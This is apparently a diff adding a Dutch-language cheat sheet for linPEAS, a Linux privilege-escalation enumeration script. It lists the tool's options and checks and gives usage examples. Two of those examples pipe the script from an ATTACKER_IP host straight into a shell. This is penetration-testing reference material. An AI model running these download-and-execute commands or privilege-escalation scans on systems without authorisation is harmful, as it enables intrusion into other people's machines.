@@ -1,0 +1,52 @@
+# linPEAS — Linux Privilege Escalation Awesome Scripts
+# Uitgebreide enumeratie van privilege escalation vectoren op Linux/macOS
+#
+# === Syntax ===
+# chmod +x linpeas.sh && ./linpeas.sh [opties]
+#
+# === Belangrijkste opties ===
+# -a                Alle checks uitvoeren (intensief)
+# -s                Superfast modus (alleen snelle checks)
+# -P <password>     Wachtwoord meegeven voor sudo checks
+# -D                Debug modus
+# -o <dir>          Output directory
+# -N                Geen netwerk scan
+#
+# === Checks (automatisch) ===
+# System info       OS, kernel, PATH, datum, schrijfbare paden
+# Processes          Draaiende processen, cron jobs, timers
+# Network            Open poorten, verbindingen, ARP
+# Users              /etc/passwd, groepen, sudo rechten, .ssh
+# SUID/SGID          Binaries met SUID/SGID bit
+# Capabilities       Linux capabilities op binaries
+# Software           Geinstalleerde packages, versies
+# Files              Writable configs, backups, wachtwoord bestanden
+# Container          Docker/LXC/Kubernetes detectie
+#
+# === Voorbeelden ===
+
+# Standaard scan
+chmod +x linpeas.sh
+./linpeas.sh
+
+# Superfast modus
+./linpeas.sh -s
+
+# Alle checks inclusief zware enumeratie
+./linpeas.sh -a
+
+# Met sudo wachtwoord voor privilege checks
+./linpeas.sh -P 'USER_PASSWORD'
+
+# Output opslaan
+./linpeas.sh -a | tee /tmp/linpeas_output.txt
+
+# Download en uitvoeren in één stap
+curl http://ATTACKER_IP/tools/linpeas.sh | bash
+
+# Zonder naar schijf te schrijven
+curl -sSL http://ATTACKER_IP/tools/linpeas.sh | sh
+
+# NOTE: Uitvoer is kleurgecodeerd: ROOD/GEEL = interessante bevindingen
+# NOTE: Gebruik -s voor snelle eerste scan, -a voor grondige analyse
+# NOTE: Combineer met linux-exploit-suggester voor kernel exploits
